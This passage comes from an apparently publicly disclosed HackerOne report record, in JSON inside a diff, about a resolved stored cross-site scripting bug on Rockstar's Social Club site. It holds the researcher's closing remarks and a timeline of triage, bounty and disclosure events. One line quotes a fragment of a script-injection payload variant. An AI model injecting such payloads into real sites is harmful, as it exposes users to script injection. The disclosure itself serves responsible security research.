<code>\u3008script/src=//...?</code> and it was promptly fixed in both its variations.</p>\n\n<h3 id=\"conclusions\">Conclusions</h3>\n\n<p>The Rockstar Games team is amazing. My first duplicate report was with them back in September and if it wasn&#39;t for <a href=\"/jmarshall\">@jmarshall</a> reacting so politely to my unjustified noobish irk to a duplicate I would&#39;ve probably dropped bug bounties altogether.<br><br>\nIt&#39;s been great to be involved all these months into researching new things and approaches\u2014failing for weeks at a time allowed me to learn new techniques and extremely peculiar quirks I now feel ready to share with the community. I still go back and try new ideas as of today, so far without success. Which is great.</p>\n\n<p>Ad maiora!</p>\n"
+        }
+    ], 
+    "structured_scope": {
+        "asset_identifier": "socialclub.rockstargames.com", 
+        "max_severity": "critical", 
+        "databaseId": 430, 
+        "asset_type": "URL"
+    }, 
+    "allow_singular_disclosure_at": "2018-05-08T13:42:20.082Z", 
+    "state": "Closed", 
+    "cve_ids": [], 
+    "activity_page_number": 1, 
+    "readable_substate": "Resolved", 
+    "public": true, 
+    "formatted_bounty": "$1,000", 
+    "singular_disclosure_disabled": false, 
+    "activities": [
+        {
+            "automated_response": false, 
+            "created_at": "2018-01-26T20:48:17.468Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-01-26T20:48:17.468Z", 
+            "actor": {
+                "username": "jmarshall", 
+                "url": "/jmarshall", 
+                "profile_picture_urls": {
+                    "medium": "/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "rockstargames", 
+            "message": "", 
+            "markdown_message": "", 
+            "type": "Activities::Comment", 
+            "id": 2321999, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2018-01-26T20:48:37.378Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-01-26T20:48:37.378Z", 
+            "actor": {
+                "username": "jmarshall", 
+                "url": "/jmarshall", 
+                "profile_picture_urls": {
+                    "medium": "/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "rockstargames", 
+            "message": "", 
+            "markdown_message": "", 
+            "type": "Activities::BugTriaged", 
+            "id": 2322002, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2018-01-27T09:49:14.248Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-01-27T09:52:26.436Z", 
+            "actor": {
+                "username": "europa", 
+                "url": "/europa", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/189/882/dd8e03ce60a513417afe21ed6bdbedf1dbaa1898_medium.jpg?1533370630"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "rockstargames", 
+            "message": "", 
+            "markdown_message": "", 
+            "type": "Activities::Comment", 
+            "id": 2323538, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2018-02-16T02:24:20.583Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-02-16T02:24:20.583Z", 
+            "actor": {
+                "username": "jmarshall", 
+                "url": "/jmarshall", 
+                "profile_picture_urls": {
+                    "medium": "/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "rockstargames", 
+            "message": "", 
+            "markdown_message": "", 
+            "type": "Activities::Comment", 
+            "id": 2388599, 
+            "genius_execution_id": null
+        }, 
+        {
+            "bounty_currency": "usd", 
+            "automated_response": false, 
+            "created_at": "2018-02-16T02:24:34.313Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-02-16T02:24:34.313Z", 
+            "actor": {
+                "url": "/rockstargames", 
+                "profile": {
+                    "name": "Rockstar Games"
+                }, 
+                "ibb": false, 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/002/143/3f252d109e077cdd40613ce40116fed34b20ccc8_medium.png?1433294886"
+                }
+            }, 
+            "team_handle": "rockstargames", 
+            "bonus_amount": "0.0", 
+            "bounty_amount": "1000.0", 
+            "collaborator": {
+                "username": "europa", 
+                "url": "/europa"
+            }, 
+            "message": "", 
+            "markdown_message": "", 
+            "type": "Activities::BountyAwarded", 
+            "id": 2388600, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2018-02-16T09:30:15.773Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-02-16T09:30:15.773Z", 
+            "actor": {
+                "username": "europa", 
+                "url": "/europa", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/189/882/dd8e03ce60a513417afe21ed6bdbedf1dbaa1898_medium.jpg?1533370630"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "rockstargames", 
+            "message": "", 
+            "markdown_message": "", 
+            "type": "Activities::Comment", 
+            "id": 2390074, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2018-03-03T18:18:30.732Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-03-03T18:26:45.125Z", 
+            "actor": {
+                "username": "europa", 
+                "url": "/europa", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/189/882/dd8e03ce60a513417afe21ed6bdbedf1dbaa1898_medium.jpg?1533370630"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "rockstargames", 
+            "message": "", 
+            "markdown_message": "", 
+            "type": "Activities::Comment", 
+            "id": 2453328, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2018-03-19T11:17:50.778Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-03-19T11:17:50.778Z", 
+            "actor": {
+                "username": "europa", 
+                "url": "/europa", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/189/882/dd8e03ce60a513417afe21ed6bdbedf1dbaa1898_medium.jpg?1533370630"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "rockstargames", 
+            "message": "", 
+            "markdown_message": "", 
+            "type": "Activities::Comment", 
+            "id": 2505855, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "reporter": {
+                "username": "europa", 
+                "url": "/europa"
+            }, 
+            "created_at": "2018-03-19T15:29:03.247Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-03-19T15:29:03.247Z", 
+            "actor": {
+                "username": "jmarshall", 
+                "url": "/jmarshall", 
+                "profile_picture_urls": {
+                    "medium": "/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "rockstargames", 
+            "message": "", 
+            "markdown_message": "", 
+            "type": "Activities::BugResolved", 
+            "id": 2506460, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2018-04-08T13:42:19.986Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-04-08T13:42:19.986Z", 
+            "actor": {
+                "username": "europa", 
+                "url": "/europa", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/189/882/dd8e03ce60a513417afe21ed6bdbedf1dbaa1898_medium.jpg?1533370630"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "rockstargames", 
+            "first_to_agree": true, 
+            "message": "", 
+            "markdown_message": "", 
+            "type": "Activities::AgreedOnGoingPublic", 
+            "id": 2578400, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2018-04-09T14:05:09.320Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-04-09T14:05:09.320Z", 
+            "actor": {
+                "username": "jmarshall", 
+                "url": "/jmarshall", 
+                "profile_picture_urls": {
+                    "medium": "/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "rockstargames", 
+            "message": "", 
+            "markdown_message": "", 
+            "type": "Activities::Comment", 
+            "id": 2581257, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2018-04-09T14:09:56.148Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-04-09T14:09:56.148Z", 
+            "actor": {
+                "username": "europa", 
+                "url": "/europa", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/189/882/dd8e03ce60a513417afe21ed6bdbedf1dbaa1898_medium.jpg?1533370630"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "rockstargames", 
+            "message": "", 
+            "markdown_message": "", 
+            "type": "Activities::Comment", 
+            "id": 2581267, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2018-04-09T17:55:49.054Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-04-09T17:55:49.054Z", 
+            "actor": {
+                "username": "europa", 
+                "url": "/europa", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/189/882/dd8e03ce60a513417afe21ed6bdbedf1dbaa1898_medium.jpg?1533370630"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "rockstargames", 
+            "message": "", 
+            "markdown_message": "", 
+            "type": "Activities::Comment", 
+            "id": 2582748, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2018-04-19T15:25:44.316Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-04-19T15:25:44.316Z", 
+            "actor": {
+                "username": "jmarshall", 
+                "url": "/jmarshall", 
+                "profile_picture_urls": {
+                    "medium": "/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "rockstargames", 
+            "message": "", 
+            "markdown_message": "", 
+            "type": "Activities::Comment", 
+            "id": 2638185, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2018-04-19T15:38:26.222Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-04-19T15:38:26.222Z", 
+            "actor": {
+                "username": "europa", 
+                "url": "/europa", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/189/882/dd8e03ce60a513417afe21ed6bdbedf1dbaa1898_medium.jpg?1533370630"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "rockstargames", 
+            "message": "", 
+            "markdown_message": "", 
+            "type": "Activities::Comment", 
+            "id": 2638217, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2018-04-19T22:14:18.644Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-04-19T22:14:18.644Z", 
+            "actor": {
+                "username": "jmarshall", 
+                "url": "/jmarshall", 
+                "profile_picture_urls": {
+                    "medium": "/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "rockstargames", 
+            "message": "", 
+            "markdown_message": "", 
+            "type": "Activities::AgreedOnGoingPublic", 
+            "id": 2639503, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2018-04-19T22:14:18.826Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-04-19T22:14:18.826Z", 
+            "actor": {
+                "username": "jmarshall", 
+                "url": "/jmarshall", 
+                "profile_picture_urls": {
+                    "medium": "/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "rockstargames", 
+            "message": "", 
+            "markdown_message": "", 
+            "type": "Activities::ReportBecamePublic", 
+            "id": 2639504, 
+            "genius_execution_id": null
+        }
+    ], 
+    "in_validation?": false, 
+    "is_participant": false, 
+    "singular_disclosure_allowed": true, 
+    "reporter": {
+        "username": "europa", 
+        "hacker_mediation": false, 
+        "hackerone_triager": false, 
+        "disabled": false, 
+        "url": "/europa", 
+        "profile_picture_urls": {
+            "small": "https://profile-photos.hackerone-user-content.com/000/189/882/4f2eec8d4d5ef4e2aa81d558f03da98e62e83c37_small.jpg?1533370630"
+        }, 
+        "is_me?": false
+    }, 
+    "weakness": {
+        "id": 62, 
+        "name": "Cross-site Scripting (XSS) - Stored"
+    }, 
+    "is_external_bug": false, 
+    "visibility": "no-content", 
+    "allow_singular_disclosure_after": -18348174.567530297, 
+    "disclosed_at": "2018-04-19T22:14:18.783Z", 
+    "stage": 4, 
+    "url": "https://hackerone.com/reports/309531", 
+    "created_at": "2018-01-26T11:36:03.600Z", 
+    "original_report_url": null, 
+    "vulnerability_information_html": "", 
+    "severity_rating": "high", 
+    "team_private?": false, 
+    "team": {
+        "profile": {
+            "website": "http://www.rockstargames.com/", 
+            "about": "Publishers of such popular games as Grand Theft Auto, Max Payne, Red Dead Redemption, L.A. Noire, Bully & more.", 
+            "twitter_handle": "RockstarGames", 
+            "name": "Rockstar Games"
+        }, 
+        "handle": "rockstargames", 
+        "url": "https://hackerone.com/rockstargames", 
+        "state": "public_mode", 
+        "profile_picture_urls": {
+            "small": "https://profile-photos.hackerone-user-content.com/000/002/143/9593462347d0af4f1a75c67ee0e2b0807b34e4a3_small.png?1433294886", 
+            "medium": "https://profile-photos.hackerone-user-content.com/000/002/143/3f252d109e077cdd40613ce40116fed34b20ccc8_medium.png?1433294886"
+        }, 
+        "awards_miles": false, 
+        "permissions": [], 
+        "id": 2143, 
+        "default_currency": "usd"
+    }, 
+    "is_published": false
+}
